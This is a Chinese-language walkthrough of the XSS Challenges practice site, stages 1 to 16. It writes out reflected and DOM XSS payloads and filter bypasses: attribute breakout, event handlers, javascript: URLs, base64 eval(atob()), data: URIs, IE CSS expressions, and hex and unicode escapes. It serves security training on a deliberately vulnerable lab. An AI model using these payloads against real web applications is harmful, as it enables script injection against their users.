一个 XSS 靶场。

## 1 手动挖掘 XSS 漏洞

### 1.1 常规注入

### 1.1.1 Stage #1 无过滤的 XSS 注入

> https://xss-quiz.int21h.jp/

**分析页面与用户交互的可控参数**

查看交互栏源码

```
<input type="text" name="p1" size="60" value="">
```

> 将输入的内容作为 p1，传输给服务器

**查找页面的回显**

提交 hello（使p1=hello）

![查找页面的回显](./../../../../image/XSS%20Challenges/%E6%9F%A5%E6%89%BE%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%9B%9E%E6%98%BE.png)

查看源码

```
<b>"hello"</b>
```

**判断能否执行 javascript 代码**

设置 `p1=<script>alert(document.domain);</script>`，提交代码

```
<script>alert(document.domain);</script>
```

![提交代码](./../../../../image/XSS%20Challenges/%E6%8F%90%E4%BA%A4%E4%BB%A3%E7%A0%81.png)

查看源码

```
<b>"<script>alert(document.domain);</script>"</b>
```

> 发现插入到 \<b> \</b> 标签中，说明插入成功，且未过滤

### 1.1.2 Stage #2 属性中的 XSS 注入

>https://xss-quiz.int21h.jp/stage2.php

**查看可控参数**

查看交互栏源码

```
<input type="text" name="p1" size="60" value="">
```

**查找页面的回显**

在交互栏输入 hello

![在交互栏输入 hello](./../../../../image/XSS%20Challenges/%E5%9C%A8%E4%BA%A4%E4%BA%92%E6%A0%8F%E8%BE%93%E5%85%A5%20hello.png)

提交 hello

![提交 hello](./../../../../image/XSS%20Challenges/%E6%8F%90%E4%BA%A4%20hello.png)

> 发现回显处发生了改变

**判断能否执行 javascript 代码**

查看源码

```
<input type="text" name="p1" size="50" value="hello">
```

> 发现回显位置已经改变，此时注入 javascript 并不会执行代码

**设法执行 javascript**

闭合 **input 标签**（ 利用 "> ）

执行 javascript

```
hello"><script>alert(document.domain);</script>
```

```
<input type="text" name="p1" size="50" value="hello"><script>alert(document.domain);</script>">
```

> 成功执行 javascript

查看源码

```
<input type="text" name="p1" size="50" value="hello">
<script>alert(document.domain);</script>
">
```

插入**事件** 触发执行 js（利用 " ）

> 若过滤 >，则需要用 "
>
> 若过滤 "，则无法注入 input

HTML 中的事件概述：

> 对于 HTML 属性事件的简单介绍
> 在现代浏览器中都内置有大量的事件处理器。这些处理器会监视特定的条件或用户行为，例如鼠标单击或浏览器窗口中完成加载某个图像。通过使用客户端的 JavaScript 可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行一个或多个 JavaScript 命令或函数。
>
> > 事件是由浏览器的开发者规定的

参考

> https://www.runoob.com/tags/ref-eventattributes.html

输入以下代码：

```
" onmouseover=alert(document.domain)>
```

```
<input type="text" name="p1" size="50" value="" onmouseover=alert(document.domain)>
```

> onmouseover 事件：当鼠标指针移至元素之上时运行脚本
>
> 使用双引号闭合 value 属性，添加事件 onmouseover 当鼠标移动到添加事件的元素中时，执行 JavaScript 代码 alert(document.domain) 弹出域名

`鼠标移动到输入框会自动触发 XSS，所以事件就需要用户手动触发才能够被执行`

### 1.1.3 Stage #3 选择列表中的 XSS 注入

> https://xss-quiz.int21h.jp/stage-3.php

**分析页面与用户交互的可控参数**

查看交互栏，发现有两个

**查找页面的回显**

在第一个提交参数

```
hello
USA
```

![提交参数](./../../../../image/XSS%20Challenges/%E5%9C%A8%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0.png)

> 发现两个交互栏都有回显
>
> 实战中要看数据包，有的交互栏不易发现

查看源码

```
<b>"hello"</b> 
```

**判断能否执行 javascript 代码**

提交 js

```
<script>alert(document.domain);</script>
```

再次查看源码

```
<b>"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</b>
```

> 可以看到 js 代码被转义，无法执行 js，但是不影响显示（实体名称）
>
> 此处不存在 xss

开启 BurpSuite 拦截，提交 hello

在页面源码查看第二个交互栏

```
<b>Japan</b>
```

> 在 b 标签中，可以尝试注入

在 BurpSuite 拦截，构造代码放行

```
p1=hello&p2=USA
```

```
p1=hello&p2=<script>alert(document.domain);</script>
```

查看源码

```
<b><script>alert(document.domain);</script></b>
```

> 发现未过滤，成功注入

### 1.1.4 Stage #4 在隐藏域中注入 XSS

> https://xss-quiz.int21h.jp/stage_4.php

隐藏域是用来收集或发送不可见元素的信息，对于网页的访问者来说，隐藏域是看不见的

>当表单被提交时，隐藏域就会将信息用你设置时定义的名称和值发送到服务器

**分析页面与用户交互的可控参数**

查看页面

![查看页面](./../../../../image/XSS%20Challenges/%E6%9F%A5%E7%9C%8B%E9%A1%B5%E9%9D%A2.png)

> 发现有两栏

开启 BurpSuite 拦截，提交 hello

```
p1=hello&p2=USA&p3=hackme
```

> 发现实际有 3 个参数
>
> 有隐藏域

关闭拦截，查看页面源码

```
<input type="text" name="p1" size="30">
```

```
<select name="p2">
<option>Japan</option>
<option>Germany</option>
<option>USA</option>
<option>United Kingdom</option>
</select>
```

```
<input type="hidden" name="p3" value="hackme">
```

> p3 为隐藏域
>
> 一般为传递 token 等参数，用于采集用户信息

**查找页面的回显**

> 提交后只有两个参数显示

**判断能否执行 javascript 代码**

根据 p3 判断是否存在注入点

```
<input type="hidden" name="p3" value="hackme">
```

> 由于隐藏域无法触发，无法利用 HTML 事件
>
> 只可闭合 input 标签 再插入 js 代码

开启 BurpSuite 拦截，提交 hello

构造代码，放行

```
p3="><script>alert(document.domain)</script>
```

> 成功注入

### 1.2 绕过防御注入

### 1.2.1 Stage #5 限制输入长度的解决方式

> https://xss-quiz.int21h.jp/stage--5.php

**分析页面与用户交互的可控参数**

提交 hello

发现可控参数在 input

开启 BurpSuite 拦截，提交 hello

可以看到只有 p1 是可控参数

> 其中的 Cookie 也可能存在注入点

**查找页面的回显**

关闭拦截，查看 p1 位置源码

```
<input type="text" name="p1" maxlength="15" size="30" value="hello">
```

> 类型为 text，最多允许输入 15 个字符

**判断能否执行 javascript 代码**

可控参数:	`p1`

回显位置:	`input`

绕过方法：

> `">`	逃逸出 input， 插入 js 标签执行 js 代码
>
> `"`	  逃逸出 value 属性，插入事件，通过触发事件执行 js 代码

提交参数

```
">hello
```

查看回显

```
<input type="text" name="p1" maxlength="15" size="30" value="">
hello"> 
```

![查看回显](./../../../../image/XSS%20Challenges/%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%98%BE.png)

> 发现成功闭合，"> 生效
>
> 二者都可以使用

尝试提交 js 代码

```
"><script>alert(document.domain);</script>
```

![尝试提交 js 代码](./../../../../image/XSS%20Challenges/%E5%B0%9D%E8%AF%95%E6%8F%90%E4%BA%A4%20js%20%E4%BB%A3%E7%A0%81.png)

> 发现字符长度有限制，无法提交 js 代码

查看源码

```
<input type="text" name="p1" maxlength="15" size="30" value="">
```

>`maxlength="15" ` 限制字符长度为 15

修改限制为 150

```
<input type="text" name="p1" maxlength="150" size="30" value="">
```

再次提交

```
"><script>alert(document.domain);</script>
```

> 成功注入
>
> 由于只对前端限制，也可以通过 burpsuite 抓包修改
>
> ```
> p1="><script>alert(document.domain);</script>
> ```
>
> 若有 WAF 或后端限制，则无法修改

### 1.2.2 Stage #6 限制输入<>的 XSS 注入

> https://xss-quiz.int21h.jp/stage-no6.php

**分析页面与用户交互的可控参数**

提交 hello

查看源码

```
<input type="text" name="p1" size="50" value="hello">
```

> 参数在 input

开启 BurpSuite 拦截，提交 hello

```
p1=hello
```

> 只有 p1 是可控参数

**查找页面的回显**

页面无回显

**判断能否执行 javascript 代码**

关闭拦截，提交代码	`">`

```
"><script>alert(document.domain);<script>
```

查看源码

```
<input type="text" name="p1" size="50" value="" &gt;&lt;script&gt;alert(document.domain);&lt;script&gt;"="">
```

> 发现 `>` 被转义，`"` 未被转义

关闭拦截，提交代码 `"` 和事件

```
" onmouseover="alert(document.domain)"
```

> 移动鼠标至交互栏，成功触发

### 1.2.3 Stage #7 限制输入引号的 XSS 注入

> https://xss-quiz.int21h.jp/stage07.php

**分析页面与用户交互的可控参数**

只有一个交互栏

查看源码

```
<input type="text" name="p1" size="60" value="">
```

提交 hello

```
<input type="text" name="p1" size="50" value="hello">
```

> 参数为 input 中的 value

开启 burpsuite 拦截，提交 hello

```
p1=hello
```

> 只有一个可控参数

**查找页面的回显**

没有回显

**判断能否执行 javascript 代码**

关闭拦截，提交代码	`">`

```
"><script>alert(document.domain);<script>
```

查看源码

```
<input type="text" name="p1" size="50" value="&quot;><script>alert(document.domain);<script>">
```

> `"` 被转义，无法在此处注入

提交代码 `hello test`

> 发现只显示了 hello

查看源码

```
<input type="text" name="p1" size="50" value="hello" test="">
```

> 发现逻辑漏洞，空格后面的代码最为参数添加

提交代码 `hello test=666`

```
<input type="text" name="p1" size="50" value="xss" test="666">
```

根据漏洞构造事件

```
hello onmouseover=alert(document.domain)
```

> 成功注入

可通过 xss 特殊符号测试

```
hello ;:,hello
```

>一些常见的特殊字符容易导致XSS注入的包括:
>
>1. `<` 和 `>`：用于HTML标签的开始和结束，如果未正确转义或过滤，可以被利用进行XSS注入。
>2. `"` 和 `'`：用于引号包裹字符串，如果未正确转义或过滤，可以被利用进行XSS注入。
>3. `&`：用于HTML实体编码，如果未正确处理，可以被利用进行XSS注入。
>4. `/`：用于路径分隔符，如果未正确处理，可以被利用进行XSS注入。
>5. `;`：用于分隔语句或命令，如果未正确处理，可以被利用进行XSS注入。
>6. `(` 和 `)`：用于括号包裹表达式，如果未正确处理，可以被利用进行XSS注入。
>7. `+` 和 `-`：用于加法和减法运算，如果未正确处理，可以被利用进行XSS注入。
>8. `#`：用于URL中的锚点，如果未正确处理，可以被利用进行XSS注入。
>9. `%`：用于URL编码，如果未正确处理，可以被利用进行XSS注入。
>10. `=`：用于赋值操作，如果未正确处理，可以被利用进行XSS注入。
>
>需要注意的是，以上特殊字符只是一部分，实际上还有很多其他特殊字符也可能存在XSS注入的风险。为了防止XSS注入攻击，开发者应该对用户输入的特殊字符进行正确的转义或过滤处理。

### 1.2.4 Stage #8 JavaScript 伪协议

> https://xss-quiz.int21h.jp/stage008.php

**分析页面与用户交互的可控参数**

提交 hello

```
<input type="text" name="p1" size="50">
```

在 burpsuite 开启拦截确认

```
p1=hello
```

> 只有 p1 一个参数

**查找页面的回显**

显示 hello 在源码中查看回显

```
<a href="hello">hello</a>
```

> 有两处回显

**判断能否执行 javascript 代码**

关闭拦截，提交 ">

```html
<a href=">&quot;">&gt;"</a>
```

> 发现 " 在第一处回显被转义，> 在第二处回显被转义
>
> 有 href 锚点

href 指定跳转位置（html 锚点）

> 真协议URL跳转地址：href="http://qq.com"
>
> 伪协议URL执行代码：href="javascript:void(0)"
>
> href="	协议	:	地址	"
>
> 常用的伪协议 php	js

提交代码

```
javascript:alert(document.domain)
```

点击回显处

> 发现可以直接注入

### 1.2.5 Stage #9 UTF-7 编码注入（跳过）

> https://xss-quiz.int21h.jp/stage_09.php

控制台执行

```
alert(document.domain);
```

> UTF-7 协议，现在浏览器用的是 UTF-8，直接跳过

### 1.2.6 Stage #10 绕过关键字 domain

> https://xss-quiz.int21h.jp/stage00010.php

**分析页面与用户交互的可控参数**

在 burpsuite 开启拦截，提交 hello

```
p1=hello
```

> 发现只存在一个可控参数

**查找页面的回显**

```
<input type="text" name="p1" size="50" value="hello">
```

> 页面无回显
>
> 代码回显发现 value 标签

**判断能否执行 javascript 代码**

提交 `">hello`

> 回显发现 hello 逃逸

查看源码

```
<input type="text" name="p1" size="50" value="">
hello">; 
```

提交代码

```
"><script>alert(document.domain);</script>
```

> 发现没有回显

查看源码

```
<script>alert(document.);</script>
```

> 发现回显为 alert(document.)
>
> domain 被过滤

尝试提交双写代码

```
"><script>alert(document.dodomainmain);</script>
```

> 成功注入

**使用 base64 编码绕过**

构造 base64 编码

```
"><script>alert(document.domain);</script>
```

```
"><script>YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs=</script>
```

> 需要加入解码函数 `atob("")` 和执行函数 `eval()`

构造解码函数

```
atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs=")
```

在控制台中提交

```
'alert(document.domain);'
```

> 成功解码

构造执行函数

```
eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs="))
```

在控制台中执行

```
eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs="))
```

> 成功执行

提交代码

```
"><script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs="))</script>
```

> 成功注入

### 1.2.7 Stage #11 绕过过滤 script 和 on 关键字的 XSS 注入

> https://xss-quiz.int21h.jp/stage11th.php
>
> 无法访问

切换到站点根目录

```
┌──(root㉿Kali-24)-[~]
└─# cd /var/www/html/
```

上传 style.css 和 stage11th.php 到 kali，搭建页面

启动 apache2

    ┌──(root㉿Kali-24)-[~]
    └─# systemctl start apache2.service

浏览器访问

> http://192.168.1.24/stage11th.php

**分析页面与用户交互的可控参数**

提交 hello

```
<input type="text" name="p1" size="50" value="hello">
```

打开 burpsuite 拦截

```
p1=hello&submit=Search
```

> 可控参数只有 p1

**查找页面的回显**

关闭拦截，提交 ">hello

发现 hello"> 逃逸

```
<input type="text" name="p1" size="50" value="">
hello"&gt; 
```

> " 和 > 都可用

**判断能否执行 javascript 代码**

提交参数

```
<script>alert(document.domain);</script>
```

 回显

```
<xscript>alert(document.domain);</xscript>
```

源码

```
<input type="text" name="p1" size="50" value="<xscript>alert(document.domain);</xscript>">
```

插入事件

```
hello" onmouseover="alert(document.domain)"
```

回显

```
hello
```

源码

```
<input type="text" name="p1" size="50" value="hello" onxxx="alert(document.domain)" "="">
```

> 事件和 \<script> 都被替换

使用 \<iframe> ， \<a>，\<object> 标签进行 base64 编码提交

```
"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"></object>
```

> ```
> "><object data="data:text/html;base64,<script>alert(document.domain)</script>"></object>
> ```

> 几乎所有的 HTML 标签都可以通过添加适当的事件属性来触发 JavaScript 函数。

尝试伪协议绕过

```
"><a href="javascript:alert(document.domain)">hello</a>
```

插入编码只有实体编号没有实体名称字符（回车，Tab），避免转义

```
"><a href="javas&#x09;cript:alert(document.domain)">hello</a>
```

> 使用 Tab 编码为 HTML `&#x09;`

点击 hello

> 成功注入

### 1.2.8 Stage #12 利用 IE 浏览器特性绕过防护策略

> https://xss-quiz.int21h.jp/stage_no012.php

安装 ietester：

> 双击 install-ietester-v0.5.4.exe 安装，安装成功后，会在桌面生成 IETester 快捷方式。

使用 IE10 注入，谷歌浏览器分析

![使用 IE10 做访问](./../../../../image/XSS%20Challenges/%E4%BD%BF%E7%94%A8%20IE10%20%E5%81%9A%E8%AE%BF%E9%97%AE.png)

开启 burpsuite 配置代理

![开启 burpsuite 配置代理](./../../../../image/XSS%20Challenges/%E5%BC%80%E5%90%AF%20burpsuite%20%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86.png)

**查看可控参数**

开启拦截，提交 hello

```
p1=hello
```

> 可以可控参数只有 p1

**查看回显**

关闭拦截，查看源码

```
<input type="text" name="p1" size="50" value="hello">
```

> 可以回显为 value

**判断是否能够注入 js 代码**

提交代码

```
">hello
```

回显页面

```
hello
```

源码

```
<input type="text" name="p1" size="50" value="hello">
```

> 可以看到 `”<` 被过滤了

查看未美化的源码

```
<input type=text name=p1 size=50 value=>
```

> 但是在 IE 中可以将 `` 作为 " 使用
>
> 可测试（``）（' '）（" "）（""" """）

在 IE 中测试 ``

```
``
```

发现虽然没有回显，源码中出现了

```
<input type=text name=p1 size=50 value=``> 
```

构造事件 payload

```
`` onmousemove=alert(document.domain)
```

> 成功注入
>
> ```
> <input type=text name=p1 size=50 value=``onmousemove=alert(document.domain)> 
> ```

### 1.2.9 Stage #13 CSS 层叠样式表的 IE 特性伪协议注入

> https://xss-quiz.int21h.jp/stage13_0.php

**查看可控参数**

打开拦截，刷新

```
p1=background-color%3Asalmon
```

> 发现只有一个可控参数

**查看回显**

关闭拦截，查看源码

```
<input type="text" name="p1" size="60" style="background-color:salmon" value="background-color:salmon">
```

> 发现两处回显为	style和value
>
> 其中 style 为 css 代码，可以在 IE 通过 background-image:url() 指定伪协议 

**判断能否执行 js**

在 IE 提交 payload

```
background-image:url(javascript:alert(document.domain));
```

> 成功注入

### 1.2.10 Stage #14 通过层叠样式表中的内联注释进行注入

> https://xss-quiz.int21h.jp/stage-_-14.php

**查看可控参数**

打开拦截，刷新

```
p1=background-color%3Asalmon
```

> 只有一个可控参数

**查看回显**

关闭拦截，查看源码

```
<input type="text" name="p1" size="60" style="background-color:salmon" value="background-color:salmon">
```

>发现两处回显为	style和value
>
>其中 style 可以在 IE 通过 background-image:url() 指定伪协议 

**判断能否执行 js**

在 IE 提交 payload

```
background-image:url(javascript:alert(document.domain));
```

查看回显

```
background-image:xxx(javaxxx:alert(document.domain));
```

查看源码

```
<input type="text" name="p1" size="60" style="background-image:xxx(javaxxx:alert(document.domain));" value="background-image:xxx(javaxxx:alert(document.domain));"> 
```

> 发现有过滤，无法执行
>
> 在 IE 中的 css 可以使用 expressions ,用 /**/ 作为注释绕过，注释会替换为空

构造 payload

```
hello:expre/**/ssion(alert(document.domain));
```

> 成功注入，但是发现代码一直在执行

修改 payload，添加逻辑

```
hello:expre/**/ssion(if(!window.x){alert(document.domain);window.x=1;})
```

>为如果 window.x 不成立（！表示取反，默认判断为条件成立，则执行代码，加上！表示不成立）则执行{}内的代码，{}中对 window.x 赋值为 1，所以执行 1 次后 if 条件不成立代码不会重复执行。

### 1.3 使用编码绕过过滤

###  1.3.1 Stage #15 十六进制绕过

> https://xss-quiz.int21h.jp/stage__15.php

**查找可控参数**

打开拦截，提交 hello

```
p1=hello
```

> 只有一个可控参数

**查看回显位置**

关闭拦截，查看源码

```
<script>document.write("hello");</script>
hello
```

> 两处回显

**判断能否执行 js 代码**

提交符号

```
">
```

回显源码

```
<script>document.write("&quot;&gt;");</script>
"&gt;
```

> 可以看到 > 被转义
>
> 但是存在传递，可以利用 dom 类型漏洞

| 十六进制的应用 |
| :------------: |

| 编码               | 格式             | 备注              |
| ------------------ | ---------------- | ----------------- |
| URL                | %hex             |                   |
| XML,XHTML          | &#xhex           |                   |
| HTML,CSS           | #hex             | 6 位,用于表示颜色 |
| Unicode            | U+hex            | 6 位,表示字符编码 |
| MIME               | =hex             |                   |
| Modula-2           | #hex             |                   |
| Smalltalk,ALGOL 68 | 16rhex           |                   |
| Common Lisp        | #xhex 或#16rhex  |                   |
| IPv6               | 8 个 hex 用:分隔 |                   |

构造 payload 

```
<script>alert(document.domain);</script>
```

对 <进行编码

```
\x3c
```

提交 `\\x3c`

> 第一个 \ 是将第二个 \ 转义，避免第二个 \ 转后面的内容

> 执行后第二个回显源码为 <

对 payload 进行 hex 编码

```
\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
```

提交 payload

```
<script>document.write("\x3cscript\x3ealert(document.domain);\x3c/script\x3e");</script><script>alert(document.domain);</script>
```

>成功注入

### 1.3.2 Stage #16 使用 unicode 编码绕过关键词过滤-进行 XSS 攻击

> http://192.168.1.76/stage16th.php
>
> 浏览器访问

切换到站点根目录

```
[root@CentOS-76 ~]# cd /var/www/html/
```

上传 style.css 和 stage16th.php 到 centos，搭建页面

启动 apache2

    [root@CentOS-76 html]# systemctl start httpd.service

浏览器访问

> http://192.168.1.76/stage16th.php

**查找可控参数**

打开拦截，提交 hello

```
p1=hello&submit=reflect
```

> 可以看到只有一个可控参数

**查找回显位置**

关闭拦截，查看回显源码

```
<script>document.write("hello");</script>
hello
```

> 两处回显

**判断是否能够执行 js 代码**

提交符号

```
">
```

查看回显源码

```
<script>document.write("&quot;&gt;");</script>"&gt;
```

> 可以看到 > 被转义
>
> 但是存在传递，可以利用 dom 类型漏洞

构造 payload 

```
<script>alert(document.domain);</script>
```

对 <进行 hex 编码

```
\x3c
```

提交 `\\x3c`

> 第一个 \ 是将第二个 \ 转义，避免第二个 \ 转后面的内容

```
<script>document.write("\\x3c");</script>\x3c
```

> 执行后第二个回显源码为 `\<`
>
> 可以判断是在 `\\3c` 前加了 `\\` 变为 `\\\\3c`

对 payload 进行 unicode 编码

```
\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
```

提交 payload，查看回显源码

```
<script>document.write("\u003cscript\u003ealert(document.domain);\u003c/script\u003e");</script><script>alert(document.domain);</script>
```

> 成功注入

---

References

- [XSS Challenges](https://xss-quiz.int21h.jp/)
